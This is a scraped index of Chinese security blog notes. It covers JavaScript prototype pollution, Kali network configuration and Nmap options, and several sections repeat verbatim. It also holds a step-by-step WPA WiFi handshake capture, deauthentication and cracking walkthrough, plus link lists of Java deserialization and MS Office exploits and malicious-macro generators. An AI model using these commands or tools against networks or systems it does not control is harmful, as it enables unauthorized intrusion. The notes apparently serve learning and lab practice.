原型链污染","uri":"/javascript_prototype_pollution/#匿名函数"},{"categories":["notes"],"content":"\rJavaScript函数在Javascript中，函数使用function关键字来进行声明 function myFunction(){ } //声明一个函数 function myFuntion(a) { } //声明一个带参数的函数 function myFuntion(a) { return a; } //声明一个带返回值的函数 匿名函数 (function(a){ console.log(a); })(123); //直接调用匿名函数 调用fn()即调用了匿名函数的功能，把变量变成函数 var fn = function(){ return \"将匿名函数赋值给变量\"； } 闭包假设在函数内部新建了一个变量，函数执行完毕之后，函数内部这个独立作用域就会被删除，此时这个新建变量也会被删除。 闭包后，内部函数可以访问外部函数作用域的变量，而外部的函数不能直接获取到内部函数的作用域变量。 例如，不适用额外的全局变量来实现一个计数器 因为add变量指定了函数自我调用的返回值，每次调用值都加1而不是每次都是1 var add=(function(){ var counter = 0; return function () {return counter +=1;} }) ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:2","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#闭包"},{"categories":["notes"],"content":"\rJavaScript类如果定义一个类，需要以定义”构造函数“的方式来定义， function newClass(){ this.test = 1; } var newObj = new newClass(); 如果想添加一些方法，可以在内部使用构造方法 function newClass(){ this.test = 123; this.fn = function(){ return this.test; } } var newObj = new newClass(); newObj.fn(); class关键字可以使用class关键字来创建一个类 如果不定义构造方法，JavaScript会自动添加一个空的构造方法 class ClassName{ constructor(){...} } 使用new创建对象 let testClass = new myClass(\"testtest\"); 往对象添加属性直接使用.属性名即可，例如向testClass添加aaa属性 testClass.aaa = 333; 举个例子JavaScript中，我们以构造函数的方式来定义类： function a() { this.bar = 1 } new a() a函数的内容，就是a类的构造函数，而this.bar就是a类的一个属性。 我们也可以将方法定义在构造函数内部： function a() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new a()).show() 每当我们新建一个a对象，this.show = function...就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。 如果希望在创建类的时候只创建一次show方法，这时候就需要使用原型（prototype）： function a() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let a = new a() foo.show() 我们可以认为原型prototype是类a的一个属性，而所有用a类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。 我们可以通过a.prototype来访问a类的原型，但a实例化出来的对象，是不能通过prototype访问原型的，需要用__proto__ foo.__proto__ == Foo.prototype ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:3","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#javascript类"},{"categories":["notes"],"content":"\rJavaScript类如果定义一个类，需要以定义”构造函数“的方式来定义， function newClass(){ this.test = 1; } var newObj = new newClass(); 如果想添加一些方法，可以在内部使用构造方法 function newClass(){ this.test = 123; this.fn = function(){ return this.test; } } var newObj = new newClass(); newObj.fn(); class关键字可以使用class关键字来创建一个类 如果不定义构造方法，JavaScript会自动添加一个空的构造方法 class ClassName{ constructor(){...} } 使用new创建对象 let testClass = new myClass(\"testtest\"); 往对象添加属性直接使用.属性名即可，例如向testClass添加aaa属性 testClass.aaa = 333; 举个例子JavaScript中，我们以构造函数的方式来定义类： function a() { this.bar = 1 } new a() a函数的内容，就是a类的构造函数，而this.bar就是a类的一个属性。 我们也可以将方法定义在构造函数内部： function a() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new a()).show() 每当我们新建一个a对象，this.show = function...就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。 如果希望在创建类的时候只创建一次show方法，这时候就需要使用原型（prototype）： function a() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let a = new a() foo.show() 我们可以认为原型prototype是类a的一个属性，而所有用a类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。 我们可以通过a.prototype来访问a类的原型，但a实例化出来的对象，是不能通过prototype访问原型的，需要用__proto__ foo.__proto__ == Foo.prototype ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:3","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#class关键字"},{"categories":["notes"],"content":"\rJavaScript类如果定义一个类，需要以定义”构造函数“的方式来定义， function newClass(){ this.test = 1; } var newObj = new newClass(); 如果想添加一些方法，可以在内部使用构造方法 function newClass(){ this.test = 123; this.fn = function(){ return this.test; } } var newObj = new newClass(); newObj.fn(); class关键字可以使用class关键字来创建一个类 如果不定义构造方法，JavaScript会自动添加一个空的构造方法 class ClassName{ constructor(){...} } 使用new创建对象 let testClass = new myClass(\"testtest\"); 往对象添加属性直接使用.属性名即可，例如向testClass添加aaa属性 testClass.aaa = 333; 举个例子JavaScript中，我们以构造函数的方式来定义类： function a() { this.bar = 1 } new a() a函数的内容，就是a类的构造函数，而this.bar就是a类的一个属性。 我们也可以将方法定义在构造函数内部： function a() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new a()).show() 每当我们新建一个a对象，this.show = function...就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。 如果希望在创建类的时候只创建一次show方法，这时候就需要使用原型（prototype）： function a() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let a = new a() foo.show() 我们可以认为原型prototype是类a的一个属性，而所有用a类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。 我们可以通过a.prototype来访问a类的原型，但a实例化出来的对象，是不能通过prototype访问原型的，需要用__proto__ foo.__proto__ == Foo.prototype ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:3","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#使用new创建对象"},{"categories":["notes"],"content":"\rJavaScript类如果定义一个类，需要以定义”构造函数“的方式来定义， function newClass(){ this.test = 1; } var newObj = new newClass(); 如果想添加一些方法，可以在内部使用构造方法 function newClass(){ this.test = 123; this.fn = function(){ return this.test; } } var newObj = new newClass(); newObj.fn(); class关键字可以使用class关键字来创建一个类 如果不定义构造方法，JavaScript会自动添加一个空的构造方法 class ClassName{ constructor(){...} } 使用new创建对象 let testClass = new myClass(\"testtest\"); 往对象添加属性直接使用.属性名即可，例如向testClass添加aaa属性 testClass.aaa = 333; 举个例子JavaScript中，我们以构造函数的方式来定义类： function a() { this.bar = 1 } new a() a函数的内容，就是a类的构造函数，而this.bar就是a类的一个属性。 我们也可以将方法定义在构造函数内部： function a() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new a()).show() 每当我们新建一个a对象，this.show = function...就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。 如果希望在创建类的时候只创建一次show方法，这时候就需要使用原型（prototype）： function a() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let a = new a() foo.show() 我们可以认为原型prototype是类a的一个属性，而所有用a类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。 我们可以通过a.prototype来访问a类的原型，但a实例化出来的对象，是不能通过prototype访问原型的，需要用__proto__ foo.__proto__ == Foo.prototype ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:3","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#往对象添加属性"},{"categories":["notes"],"content":"\rJavaScript类如果定义一个类，需要以定义”构造函数“的方式来定义， function newClass(){ this.test = 1; } var newObj = new newClass(); 如果想添加一些方法，可以在内部使用构造方法 function newClass(){ this.test = 123; this.fn = function(){ return this.test; } } var newObj = new newClass(); newObj.fn(); class关键字可以使用class关键字来创建一个类 如果不定义构造方法，JavaScript会自动添加一个空的构造方法 class ClassName{ constructor(){...} } 使用new创建对象 let testClass = new myClass(\"testtest\"); 往对象添加属性直接使用.属性名即可，例如向testClass添加aaa属性 testClass.aaa = 333; 举个例子JavaScript中，我们以构造函数的方式来定义类： function a() { this.bar = 1 } new a() a函数的内容，就是a类的构造函数，而this.bar就是a类的一个属性。 我们也可以将方法定义在构造函数内部： function a() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new a()).show() 每当我们新建一个a对象，this.show = function...就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。 如果希望在创建类的时候只创建一次show方法，这时候就需要使用原型（prototype）： function a() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let a = new a() foo.show() 我们可以认为原型prototype是类a的一个属性，而所有用a类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。 我们可以通过a.prototype来访问a类的原型，但a实例化出来的对象，是不能通过prototype访问原型的，需要用__proto__ foo.__proto__ == Foo.prototype ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:3","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#举个例子"},{"categories":["notes"],"content":"\r原型链污染原型指的是prototype 如上文，我们使用new创建了一个newClass对象给newObj变量 function newClass(){ this.test = 1; } var newObj = new newClass(); 实际上，newObj变量使用了原型来实现对象的绑定 prototype是newClass类的一个属性，而所有用newClass类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法 也就是说： prototype是newClass类的一个属性 newClass类实例化的对象newObj不能访问prototype，但可以通过.__proto__来访问newClass类的prototype newClass实例化的对象newObj的.__proto__指向newClass类的prototype 关系图如下： ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:2:0","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#原型链污染"},{"categories":["notes"],"content":"\r原型链污染原理现在已经知道实例化的对象的.__proto__指向类的prototype 那么修改了实例化的对象的.__proto__的内容, 类的prototype内容也会发生相应改变 ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:2:1","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#原型链污染原理"},{"categories":["notes"],"content":"\r一个简单利用的例子有一个类a function a() { this.test = 1; } 实例化一个对象obj var obj = new a(); 此时查看ob的内容 修改a类的原型，添加一个属性test1，令其值为123 a.prototype.test1 = 123; 再次查看obj的内容，多了一个test1 访问obj.test1 再实例化一个a的对象 var obj1 = new a(); 访问obj.test1，发现也是123 然后尝试通过obj1的.__proto__属性来修改test1的值 obj1.__proto__.test1 = 124; 此时访问obj.test1，发现也被修改成了124 obj，obj.test1也随之改变 查看a的属性 通过obj1中.__proto__属性添加一个新属性，和上面修改a类的原型的过程也是一样的 添加新属性test2 obj1.__proto__.test2 = 111; 可以发现obj中也出现了新属性test2, 并且a类中也出现了新属性test2 ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:2:2","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#一个简单利用的例子"},{"categories":["notes"],"content":"\r进一步利用先实例化一个字典对象，叫obj，内有key名为test，test的value是123 var obj = {\"test\": 123}; 然后通过obj的.__proto__属性为test重新赋值 obj.__proto__.test = 2; 再实例化一个空字典对象，叫ooo var ooo = {}; 查看ooo的test属性，为2 因为Object类的test属性已经被污染，而对象ooo和obj同属Object类 再看obj的test属性的值，为123 ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:2:3","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#进一步利用"},{"categories":["notes"],"content":"\r查找顺序 所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承机制。 比如： function Father() { this.first_name = 'Donald' this.last_name = 'Trump' } function Son() { this.first_name = 'Melania' } Son.prototype = new Father() let son = new Son() console.log(`Name: ${son.first_name} ${son.last_name}`) Son类继承了Father类的last_name属性，最后输出的是Name: Melania Trump。 总结一下，对于对象son，在调用son.last_name的时候，实际上JavaScript引擎会进行如下操作： 在对象son中寻找last_name 如果找不到，则在son.__proto__中寻找last_name 如果仍然找不到，则继续在son.proto.__proto__中寻找last_name 依次寻找，直到找到null结束。比如，Object.prototype的__proto__就是null https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html 比如说此处的obj 利用.__proto__修改值后的test属性在当前对象的test属性下面（也就是在当前对象所绑定的prototype中）， 所以优先读取当前对象下的test属性，即未被修改的值123 而ooo对象由于当前属性中没有test属性，只能从它绑定的prototype中找test对象（或下一级的prototype）， 没找到返回undefined ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:2:4","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#查找顺序"},{"categories":["notes"],"content":"\r【参考资料】PHITHON《深入理解 JavaScript Prototype 污染攻击》 depy《深入理解原型链污染漏洞》 ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:3:0","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#参考资料"},{"categories":["exp"],"content":"收集的一部分Java反序列化漏洞exp https://github.com/brianwrf/hackUtils java反序列化利用 https://github.com/GoSecure/break-fast-serial 借助DNS解析来检测Java反序列化漏洞工具 https://github.com/s1kr10s/Apache-Struts-v3 Apache-Struts漏洞利用工具 https://github.com/iBearcat/S2-057 struts2 CVE-2018-11776 漏洞检测工具 https://github.com/Ivan1ee/struts2-057-exp struts2-057利用脚本 https://github.com/theLSA/s2sniper struts2漏洞的检测工具 https://github.com/Lucifer1993/struts-scan 批量检测struts命令执行漏洞 https://github.com/lijiejie/struts2_045_scan Struts2-045漏洞批量扫描工具 https://github.com/riusksk/StrutScan 基于perl的strut2的历史漏洞扫描 https://github.com/Coalfire-Research/java-deserialization-exploits java反序列化漏洞收集 https://github.com/quentinhardy/jndiat weblogic漏洞利用工具 https://github.com/jas502n/CVE-2018-3191 Weblogic CVE-2018-3191远程代码命令执行 https://github.com/pyn3rd/CVE-2018-3245 weblogic cve-2018-2893与cve-2018-3245远程代码命令执行 https://github.com/NickstaDB/BaRMIe 用于Java Remote Method Invocation服务的工具/rmi的枚举与远程命令执行 https://github.com/joaomatosf/jexboss JBoss和其他java序列化漏洞验证和开发工具 https://github.com/frohoff/ysoserial java反序列化利用工具 ","date":"2023-11-17","objectID":"/java_unserialize_exp/:0:0","series":null,"tags":["exp"],"title":"Java反序列化漏洞exp收集","uri":"/java_unserialize_exp/#"},{"categories":["linux"],"content":"kali linux 手动配网 ","date":"2023-11-17","objectID":"/kali_linux_manual_distribution_network/:0:0","series":null,"tags":["linux"],"title":"kali linux 手动配网","uri":"/kali_linux_manual_distribution_network/#"},{"categories":["linux"],"content":"\r0x1VMnet打靶场的时候，方便起见，给kali配了静态 kali是接入互联网且和win7处在统一内网段的主机，这边用的是NAT模式，同时把DHCP服务关掉了 随后进kali手动配置，kali跟linux的通用配置并不一样 ","date":"2023-11-17","objectID":"/kali_linux_manual_distribution_network/:1:0","series":null,"tags":["linux"],"title":"kali linux 手动配网","uri":"/kali_linux_manual_distribution_network/#0x1vmnet"},{"categories":["linux"],"content":"\r0x2kali linux","date":"2023-11-17","objectID":"/kali_linux_manual_distribution_network/:2:0","series":null,"tags":["linux"],"title":"kali linux 手动配网","uri":"/kali_linux_manual_distribution_network/#0x2kali-linux"},{"categories":["linux"],"content":"\r基本配置 nano /etc/network/interfaces (vim或nano只是个人习惯问题，我习惯用nano) 手动添加以下内容： auto eth0 iface eth0 inet static address 192.168.126.111 netmask 255.255.255.0 gateway 192.168.126.1 随后保存重启网络就ok systemctl stop NetworkManager 随后重启网络 systemctl restart NetworkManager (如果不好用的话，重启一下就好了) ","date":"2023-11-17","objectID":"/kali_linux_manual_distribution_network/:2:1","series":null,"tags":["linux"],"title":"kali linux 手动配网","uri":"/kali_linux_manual_distribution_network/#基本配置"},{"categories":["linux"],"content":"\r顺便写一下其他网络配置：\r临时IP配置： ifconfig eth0:1 192.168.136.198 这样就可以给Kali Linux系统的eth0的网卡增加一个IP地址（Kali Linux系统允许一个网卡有两个IP地址）了，添加完成后的结果如下所示： 但这种方式仅用于配置临时性的IP地址，当系统重启或者网络服务重启后，我们这样配置的IP地址即失效。 DNS配置： nano /etc/resolv.conf resolv.conf 的关键字主要有四个，分别是： nameserver //定义DNS服务器的IP地址 domain //定义本地域名 search //定义域名的搜索列表 sortlist //对返回的域名进行排序 然后重启网络服务 /etc/init.d/networking restart 看了网上许多师傅的博客，可能是因为版本差异，最后在配dns的resolv.conf文件里的写法可能并太一样，中途就遇到了dns死活不好用的情况，最终吧原来的网卡删了，重新开了个虚拟网卡，开启DHCP，win7和kali的网络就恢复正常了 ","date":"2023-11-17","objectID":"/kali_linux_manual_distribution_network/:2:2","series":null,"tags":["linux"],"title":"kali linux 手动配网","uri":"/kali_linux_manual_distribution_network/#顺便写一下其他网络配置"},{"categories":["linux"],"content":"\r顺便写一下其他网络配置：\r临时IP配置： ifconfig eth0:1 192.168.136.198 这样就可以给Kali Linux系统的eth0的网卡增加一个IP地址（Kali Linux系统允许一个网卡有两个IP地址）了，添加完成后的结果如下所示： 但这种方式仅用于配置临时性的IP地址，当系统重启或者网络服务重启后，我们这样配置的IP地址即失效。 DNS配置： nano /etc/resolv.conf resolv.conf 的关键字主要有四个，分别是： nameserver //定义DNS服务器的IP地址 domain //定义本地域名 search //定义域名的搜索列表 sortlist //对返回的域名进行排序 然后重启网络服务 /etc/init.d/networking restart 看了网上许多师傅的博客，可能是因为版本差异，最后在配dns的resolv.conf文件里的写法可能并太一样，中途就遇到了dns死活不好用的情况，最终吧原来的网卡删了，重新开了个虚拟网卡，开启DHCP，win7和kali的网络就恢复正常了 ","date":"2023-11-17","objectID":"/kali_linux_manual_distribution_network/:2:2","series":null,"tags":["linux"],"title":"kali linux 手动配网","uri":"/kali_linux_manual_distribution_network/#临时ip配置"},{"categories":["linux"],"content":"\r顺便写一下其他网络配置：\r临时IP配置： ifconfig eth0:1 192.168.136.198 这样就可以给Kali Linux系统的eth0的网卡增加一个IP地址（Kali Linux系统允许一个网卡有两个IP地址）了，添加完成后的结果如下所示： 但这种方式仅用于配置临时性的IP地址，当系统重启或者网络服务重启后，我们这样配置的IP地址即失效。 DNS配置： nano /etc/resolv.conf resolv.conf 的关键字主要有四个，分别是： nameserver //定义DNS服务器的IP地址 domain //定义本地域名 search //定义域名的搜索列表 sortlist //对返回的域名进行排序 然后重启网络服务 /etc/init.d/networking restart 看了网上许多师傅的博客，可能是因为版本差异，最后在配dns的resolv.conf文件里的写法可能并太一样，中途就遇到了dns死活不好用的情况，最终吧原来的网卡删了，重新开了个虚拟网卡，开启DHCP，win7和kali的网络就恢复正常了 ","date":"2023-11-17","objectID":"/kali_linux_manual_distribution_network/:2:2","series":null,"tags":["linux"],"title":"kali linux 手动配网","uri":"/kali_linux_manual_distribution_network/#dns配置"},{"categories":["penetration"],"content":"一个很老wifi攻击手法 注意：私自破解他人 WiFi 属于违法行为，我这里使用的是自己买的 迷你版路由器 作为学习和测试。明白了破解原理就知道应该怎么防范了。 一、软件\u0026硬件环境 虚拟机：VMware Workstation 15.5.1 Pro Kali：kali-linux-2020.4-installer-amd64.iso 无线网卡：RT3070、RTL8187 等，自行选择 字典：WPA.txt 二、前期配置 1、打开 USB… 服务 打开 VMware USB Arbitration Service 服务，首先是 Win+R，输入 services.msc，敲击 Enter 键。 找到 VMware USB Arbitration Service，然后启动服务就可以了。 2、加载网卡 加载网卡之前，先完全启动 kali，然后 虚拟机 → 可移动设备 → 你的网卡 → 连接(断开与 主机 的连接)。 点击确定就行了。 查看网卡是否加载进来了。从图片中可以看出，名为 wlan0 的网卡已经加载进了 kali 中。 iwconfig 三、正式开始 1、开启无线网卡的监听模式 查看网卡是否支持监听模式。 airmon-ng 注：从图中可以看到我的无线网卡 wlan0 是支持监听模式的。如果该命令没有任何输出则表示没有可以支持监听模式的网卡。 开启无线网卡的监听模式。 airmon-ng start wlan0 开启监听模式之后，无线接口 wlan0 变成了 wlan0mon，可以使用 iwconfig 命令查看，如下图所示： 2、扫描当前环境的 WiFi 网络 使用 airodump-ng 命令列出无线网卡扫描到的 WiFi 详细信息，包括信号强度，加密类型，信道等。这里我们记下要破解WiFi 的 BSSID 和 信道，如图中我用红色框框标记出来的。当搜索到我们想要破解的 WiFi 热点时可以 Ctrl+C 停止搜索。 airodump-ng wlan0mon 3、抓取握手包 使用网卡的监听模式抓取周围的无线网络数据包，其中我们需要用到的数据包是包含了 WiFi密码 的握手包，当有新用户连接 WiFi 时会发送握手包。 airodump-ng -c 1 –bssid 64:51:7E:02:45:6A -w ./hack wlan0mon 参数解释： 参数 含义 -c 指定 WiFi 的通道(channel)，不细解释，自行学习 –bssid 指定 WiFi 的 BSSID，也就是 MAC 地址 -w 指定生成文件的名称 使用客户端连接这个 WiFi。 可以看到这里有握手包出现：WPA handshke: 64:51:7E:02:45:6A。 这是启动抓包命令后，生成的文件。 4、进行 WiFi 密码的破解（跑包） WPA.txt 是我上传到 kali 中的字典文件。 aircrack-ng -b 64:51:7E:02:45:6A -w ./WPA.txt ./hack-01.cap 参数解释： 参数 含义 -b 指定 WiFi 的 BSSID，也就是 MAC 地址 -w 指定字典文件 这不闲着也是闲着，就截了个动态图。以示我是真的在做，不是 P 图。 瞅瞅，看看，结果出来了，这当然肯定是我把密码（FFA4E9ED17）写进去了的，不然真的要运行到猴年马月呀。 5、附加 如果抓不到 握手包，就先把连接 WiFi 的客户端踢下线，然后对方会再次连接 WiFi，这样就可以抓取 握手包 了。抓取完 握手包 之后就可以进行上面第 4 步的破解（跑包）了。 aireplay-ng -0 5 -a 64:51:7E:02:45:6A -c 7C:B3:7B:84:54:BC wlan0mon 6、结语 能不能 破解 WiFi 网络，完全取决于你的字典是否足够强大。本文只提供学习思路，从来没有教唆他人去 破解 WiFi ，如有人举报，我不知道，我不会，我没有。请出门右拐。 ———————————————— 版权声明：本文为CSDN博主「边扯边淡」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/qq_43427482/article/details/111463630 ","date":"2023-11-17","objectID":"/kali-wifi/:0:0","series":null,"tags":["penetration"],"title":"kali打WiFi的传统思路","uri":"/kali-wifi/#"},{"categories":["exp"],"content":"收集的部分MS\u0026Office漏洞exp https://github.com/Lz1y/CVE-2017-8759 .NET Framework换行符漏洞，CVE-2017-8759完美复现 （另附加hta+powershell弹框闪烁解决方案）https://www.freebuf.com/vuls/147793.html https://github.com/WyAtu/CVE-2018-8581 Exchange使用完成添加收信规则的操作进行横向渗透和提权漏洞 https://github.com/dafthack/MailSniper PS,用于在Microsoft Exchange环境搜索电子邮件查找特定邮件（密码、网络架构信息等） https://github.com/sensepost/ruler GO,通过MAPI / HTTP或RPC / HTTP协议远程与Exchange服务器进行交互,通过客户端Outlook功能远程获取shell https://github.com/3gstudent/Smbtouch-Scanner 扫描内网永恒之蓝ETERNAL445SMB系列漏洞 https://github.com/smgorelik/Windows-RCE-exploits windows命令执行RCE漏洞POC样本，分为web与文件两种形式 https://github.com/3gstudent/CVE-2017-8464-EXP CVE-2017-8464，win快捷方式远程执行漏洞 https://github.com/Lz1y/CVE-2018-8420 Windows的msxml解析器漏洞可以通过ie或vbs执行后门 https://www.anquanke.com/post/id/163000 利用Excel 4.0宏躲避杀软检测的攻击技术分析 https://github.com/BuffaloWill/oxml_xxe XXE漏洞利用 https://thief.one/2017/06/20/1/ 浅谈XXE漏洞攻击与防御 https://github.com/thom-s/docx-embeddedhtml-injection word2016，滥用Word联机视频特征执行恶意代码poc https://blog.cymulate.com/abusing-microsoft-office-online-video word2016，滥用Word联机视频特征执行恶意代码介绍 https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads 无需开启宏即可在word文档中利用DDE执行命令 http://www.freebuf.com/articles/terminal/150285.html 无需开启宏即可在word文档中利用DDE执行命令利用 https://github.com/Ridter/CVE-2017-11882 利用word文档RTF获取shell，https://evi1cg.me/archives/CVE_2017_11882_exp.html https://github.com/Lz1y/CVE-2017-8759 利用word文档hta获取shell，http://www.freebuf.com/vuls/147793.html https://fuping.site/2017/04/18/CVE-2017-0199漏洞复现过程 WORD RTF 文档，配合msf利用 https://github.com/tezukanice/Office8570 利用ppsx幻灯片远程命令执行，https://github.com/rxwx/CVE-2017-8570 https://github.com/0x09AL/CVE-2018-8174-msf 目前支持的版本是 32 位 IE 浏览器和 32 位 office。 网页访问上线，浏览器关闭，shell 依然存活，http://www.freebuf.com/vuls/173727.html http://www.4hou.com/technology/9405.html 在 Office 文档的属性中隐藏攻击载荷 https://evi1cg.me/archives/Create_PPSX.html 构造PPSX钓鱼文件 https://github.com/enigma0x3/Generate-Macro PowerShell脚本，生成含有恶意宏的Microsoft Office文档 https://github.com/mwrlabs/wePWNise 生成独立于体系结构的VBA代码，用于Office文档或模板，并自动绕过应用程序控制 https://github.com/curi0usJack/luckystrike 基于ps，用于创建恶意的Office宏文档 https://github.com/sevagas/macro_pack MS Office文档、VBS格式、快捷方式payload捆绑 https://github.com/khr0x40sh/MacroShop 一组通过Office宏传递有效载荷的脚本 ","date":"2023-11-17","objectID":"/msoffice_exp/:0:0","series":null,"tags":["exp"],"title":"MS\u0026Office漏洞exp收集","uri":"/msoffice_exp/#"},{"categories":["tools","manual"],"content":"Nmap参数说明 ","date":"2023-11-17","objectID":"/nmap/:0:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#"},{"categories":["tools","manual"],"content":"\r基本操作","date":"2023-11-17","objectID":"/nmap/:0:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#基本操作"},{"categories":["tools","manual"],"content":"\r基本快速扫描Nmap 默认发送一个 arp 的 ping 数据包，来探测一些常用端口是否开放。 CODE nmap 10.130.1.43 ","date":"2023-11-17","objectID":"/nmap/:1:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#基本快速扫描"},{"categories":["tools","manual"],"content":"\r快速扫描多个目标 BASHnmap \u003ctarget ip1 address\u003e \u003ctarget ip2 address\u003e nmap 10.130.1.28 10.130.1.43 ","date":"2023-11-17","objectID":"/nmap/:2:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#快速扫描多个目标"},{"categories":["tools","manual"],"content":"\r详细描述输出扫描简单扫描，并对返回的结果详细描述输出，这个扫描是可以看到扫描的过程的，漫长的扫描的过程中可以看到百分比， 就不会显得那么枯燥，而且可以提升逼格。 CODE nmap -vv 10.1.1.254 亲测，`-v` 和 `-vv` 扫描几乎是一样都，都是列出了详细的扫描过程。 ","date":"2023-11-17","objectID":"/nmap/:3:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#详细描述输出扫描"},{"categories":["tools","manual"],"content":"\r指定端口和范围扫描Nmap 默认扫描目标的常见端口号。我们可以通过参数 -p 来指定设置我们将要扫描的端口号： BASHnmap -p(range) \u003ctarget IP\u003e namp -p3389,20-100 10.130.1.43 ","date":"2023-11-17","objectID":"/nmap/:4:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#指定端口和范围扫描"},{"categories":["tools","manual"],"content":"\r扫描除过某一个 ip 外的所有子网主机 CODE nmap 10.130.1.1/24 -exclude 10.130.1.1 ","date":"2023-11-17","objectID":"/nmap/:5:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#扫描除过某一个-ip-外的所有子网主机"},{"categories":["tools","manual"],"content":"\r扫描除过某一个文件中的 ip 外的子网主机 BASH nmap 10.130.1.1/24 -excludefile gov.txt ","date":"2023-11-17","objectID":"/nmap/:6:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#扫描除过某一个文件中的-ip-外的子网主机"},{"categories":["tools","manual"],"content":"\r显示扫描的所有主机的列表 BASH nmap -sL 10.130.1.1/24 ","date":"2023-11-17","objectID":"/nmap/:7:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#显示扫描的所有主机的列表"},{"categories":["tools","manual"],"content":"\rsP ping 扫描Nmap 可以利用类似 Window/Linux 系统下的 ping 方式进行扫描 BASH nmap -sP \u003ctarget ip\u003e 一般来说 我们会用这个命令去扫描内网的一个 IP 范围，用来做内网的主机发现。 BASH nmap -sP 10.130.1.1-255 PING 扫描不同于其它的扫描方式，因为它只用于找出主机是否是存在在网络中的。它不是用来发现是否开放端口的，PING 扫描需要 ROOT 权限。 ","date":"2023-11-17","objectID":"/nmap/:8:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#sp-ping-扫描"},{"categories":["tools","manual"],"content":"\rsS SYN 半开放扫描 BASH nmap -sS 192.168.1.1 Tcp SYN Scan (sS) 这是一个基本的扫描方式，它被称为半开放扫描，因为这种技术使得 Nmap 不需要通过完整的握手，就能获得远程主机的信息。Nmap 发送 SYN 包到远程主机，但是它不会产生任何会话。因此不会在目标主机上产生任何日志记录，因为没有形成会话。这个就是 SYN 扫描的优势，如果 Nmap 命令中没有指出扫描类型，默认的就是 Tcp SYN。但是它同样也需要 root/administrator 权限。 ","date":"2023-11-17","objectID":"/nmap/:9:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#ss-syn-半开放扫描"},{"categories":["tools","manual"],"content":"\rsT TCP 扫描 BASH nmap -sT 192.168.1.1 不同于 Tcp SYN 扫描，Tcp connect () 扫描需要完成三次握手，并且要求调用系统的 connect ().Tcp connect () 扫描技术只适用于找出 TCP 和 UDP 端口。 ","date":"2023-11-17","objectID":"/nmap/:10:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#st-tcp-扫描"},{"categories":["tools","manual"],"content":"\rsU UDP 扫描 BASH nmap -sU 192.168.1.1 这种扫描技术用来寻找目标主机打开的 UDP 端口，它不需要发送任何的 SYN 包，因为这种技术是针对 UDP 端口的。UDP 扫描发送 UDP 数据包到目标主机，并等待响应。如果返回 ICMP 不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的。 